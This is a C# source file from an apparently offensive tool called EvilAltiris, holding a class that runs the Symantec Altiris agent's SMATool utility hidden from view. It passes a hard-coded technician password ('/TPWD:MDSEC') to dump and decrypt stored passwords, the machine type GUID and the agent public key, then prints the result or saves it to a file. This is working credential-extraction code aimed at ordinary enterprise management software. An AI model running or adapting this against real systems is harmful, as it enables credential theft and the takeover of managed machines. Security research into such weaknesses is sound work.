using System;
using System.Diagnostics;

namespace EvilAltiris.Lib.SMATool
{
    public class SMAToolRunner
    {
        private readonly string _binPath;

        public SMAToolRunner(string binPath)
        {
            _binPath = binPath;
        }

        public void Run(string cmd, string outfile = "", string data = "")
        {
            // Determine arguments based on command
            string arguments = GetArguments(cmd, data);

            if (string.IsNullOrEmpty(arguments))
            {
                Console.WriteLine("[!] Invalid command specified.");
                return;
            }

            // Setup process start info
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                FileName = _binPath,
                Arguments = arguments,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            // Execute the process
            ExecuteProcess(processStartInfo, outfile);
        }

        private string GetArguments(string cmd, string data)
        {
            switch (cmd.ToLower())
            {
                case "decrypt":
                    return $"/TPWD:MDSEC /DATA DUMP PASSWORD {data}";
                case "gettypeguid":
                    return "/TPWD:MDSEC /AGENT DUMP MACHINETYPE";
                case "getpublickey":
                    return "/TPWD:MDSEC /AGENT DUMP PUBLICKEY";
                default:
                    return null;
            }
        }

        private void ExecuteProcess(ProcessStartInfo processStartInfo, string outfile = "")
        {
            using (Process process = new Process())
            {
                try
                {
                    process.StartInfo = processStartInfo;
                    process.Start();

                    // Capture output and errors
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    process.WaitForExit();

                    // Display output and error messages
                    if (!string.IsNullOrEmpty(output))
                    {
                        if (outfile != "")
                        {
                            DataHandler.WriteToFile(output, outfile);
                        }
                        else
                        {
                            Console.WriteLine("[+] SMATool output:");
                            Console.WriteLine(output);
                        }
                    }

                    if (!string.IsNullOrEmpty(error))
                    {
                        Console.WriteLine("[!] SMATool error:");
                        Console.WriteLine(error);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] An error occurred: " + ex.Message);
                }
            }
        }
    }
}